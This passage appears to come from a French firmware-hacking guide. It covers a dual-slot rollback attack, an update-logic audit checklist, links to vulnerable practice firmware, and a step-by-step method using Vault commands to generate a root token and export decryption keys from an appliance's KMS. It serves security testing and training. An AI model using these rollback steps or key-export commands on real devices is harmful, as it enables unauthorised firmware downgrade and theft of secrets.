Cela crée un primitive **valider-une-image / en démarrer-une-autre** dans les systèmes à double slot. Si l’attaquant peut faire marquer le slot B comme prochaine cible de démarrage par l’updater à l’aide d’une image signée actuelle, puis écraser le slot B avant le redémarrage, le bootloader peut quand même démarrer l’image rétrogradée, car il ne fait confiance qu’aux métadonnées de slot déjà validées.

Schéma d’abus courant :

1. Téléverser un firmware **actuel et signé** dans le slot passif, puis exécuter la routine normale de validation/basculement afin que la disposition marque ce slot comme prochain slot actif.
2. **Ne pas redémarrer tout de suite**. Relancer la routine de préparation/effacement du slot dans la même session.
3. Exploiter un état de démarrage obsolète ou une logique de sélection de slot obsolète pour que l’updater efface le **même slot physique** qui vient d’être promu.
4. Écrire un firmware **plus ancien, mais toujours signé**, dans ce slot.
5. Ignorer la routine de validation qui applique le ratchet et redémarrer directement.
6. Le bootloader sélectionne le slot promu, vérifie uniquement la signature/intégrité et démarre l’ancienne image.

Points à examiner lors de la rétro-ingénierie des implémentations de mise à jour A/B :

- Sélection du slot dérivée de **drapeaux de démarrage** qui ne sont pas actualisés après un basculement réussi.
- Routine de type `prepare_passive_slot()` qui efface un slot en fonction d’un état obsolète plutôt que de la **disposition actuellement validée**.
- Fonction de type `part_write_layout()` qui ne fait qu’incrémenter un **compteur de génération** / indicateur actif et ne stocke pas le hash de l’image validée.
- Vérifications du ratchet implémentées en userspace ou dans le code de l’updater, mais **absentes** de la ROM / du bootloader / des étapes de secure boot.
- Routines d’effacement ou de récupération qui laissent le slot marqué comme amorçable même après que son contenu a été supprimé et réécrit.

### Liste de contrôle pour évaluer la logique de mise à jour

* Le transport/l’authentification de l’*endpoint de mise à jour* est-il suffisamment protégé (TLS + authentification) ?
* L’appareil compare-t-il les **numéros de version** ou un **compteur anti-rollback monotone** avant le flashage ?
* L’image est-elle vérifiée au sein d’une chaîne de secure boot (par exemple, les signatures sont-elles vérifiées par le code ROM) ?
* Le **bootloader applique-t-il le même ratchet** que l’updater, au lieu de vérifier uniquement la signature/CRC ?
* Les métadonnées d’activation du slot sont-elles **liées au digest/à la version du firmware validé**, ou le slot peut-il être modifié après sa promotion ?
* Après un basculement de slot réussi, l’appareil est-il forcé de redémarrer, ou les routines de mise à jour/d’effacement restent-elles accessibles dans la même session ?
* Le code en espace utilisateur effectue-t-il des vérifications de cohérence supplémentaires (par exemple, la carte des partitions autorisées, le numéro de modèle) ?
* Les flux de mise à jour *partiels* ou de *sauvegarde* réutilisent-ils la même logique de validation ?

> 💡  Si l’un des éléments ci-dessus manque, la plateforme est probablement vulnérable aux attaques par rollback.

## Firmware vulnérable pour s’entraîner

Pour vous entraîner à découvrir des vulnérabilités dans le firmware, utilisez les projets de firmware vulnérable suivants comme point de départ.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Récupération des clés de déchiffrement du firmware à partir de l’état intégré de KMS/Vault

Lorsqu’une image de mise à jour mélange de petites métadonnées en clair avec un grand bloc à forte entropie, commencez par examiner le conteneur avant toute attaque par force brute :<sup>[[1]](#references)</sup>

- Extrayez les en-têtes, les offsets et les limites de lignes avec `hexdump`, `xxd`, `strings -tx`, `base64 -d` et `binwalk -E`.
- `Salted__` indique généralement le format OpenSSL `enc` : les 8 octets suivants correspondent au sel et le reste aux données chiffrées.
- Un champ Base64 qui se décode en exactement `256` octets indique fortement un texte chiffré RSA-2048 qui encapsule un mot de passe de firmware/une clé de session aléatoire.
- Les éléments PGP détachés présents dans le même fichier protègent souvent uniquement l’authenticité ; ne supposez pas qu’ils assurent la confidentialité.

Si la recherche de clés statiques (`grep`, `strings`, recherches PEM/PGP) échoue, rétro-ingéniez plutôt le **flux de déchiffrement opérationnel**, au lieu de chercher uniquement des clés privées :

- Décompilez le binaire de mise à jour/de gestion et suivez le chemin : qui lit le bloc chiffré, quel helper/API le déchiffre et quel nom de clé logique est demandé.
- Recherchez l’état KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) dans le système de fichiers racine extrait, ainsi que les fichiers unit et les scripts d’init.
- Considérez les commandes `vault operator unseal ...` en clair, les clés de récupération, les jetons bootstrap ou les scripts locaux d’auto-unseal KMS comme équivalents à du matériel de clé privée.

Si l’appliance fournit le binaire Vault d’origine et son backend de stockage, reproduire cet environnement est généralement plus facile que de réimplémenter les mécanismes internes de Vault :

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Avec root sur le KMS cloné :

- Rendez les clés transit exportables uniquement dans le clone isolé : `vault write transit/keys/<name>/config exportable=true`
- Exportez la clé de déchiffrement : `vault read transit/export/encryption-key/<name>`
- Essayez la clé RSA récupérée avec la paire de padding/hash exacte utilisée par le KMS. Un échec du déchiffrement PKCS#1 v1.5 et un échec du déchiffrement OAEP par défaut ne prouvent **pas** que la clé est incorrecte ; de nombreux flux reposant sur Vault utilisent OAEP avec SHA-256, alors que les bibliothèques courantes utilisent SHA-1 par défaut.
- Si la charge utile commence par `Salted__`, reproduisez exactement le KDF OpenSSL du fournisseur (`EVP_BytesToKey`, souvent MD5 sur les appareils anciens) avant de tenter le déchiffrement AES-CBC.

Le problème de « firmware chiffré » devient alors plus général : **récupérer les clés opérationnelles côté appareil, puis reproduire hors ligne les paramètres exacts de déchiffrement et de KDF**.

## Formations et certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Craquer le firmware avec Claude : des compétences de niveau senior, une autonomie de niveau junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Méthodologie de test de sécurité du firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Pratique du hacking IoT : le guide définitif pour attaquer l’Internet des objets](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiter des zero-days dans du matériel abandonné – blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Comment un appareil connecté à 20 $ m’a donné accès à votre domicile](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Maintenant tu me vois : maintenant tu es pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploiter le Tesla Wall Connector depuis son connecteur de charge - Partie 2 : contourner la protection contre les rétrogradations](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Fais-le clignoter : exploitation over-the-air du Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS sur QEMU, partie 2 : débogage et correction](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
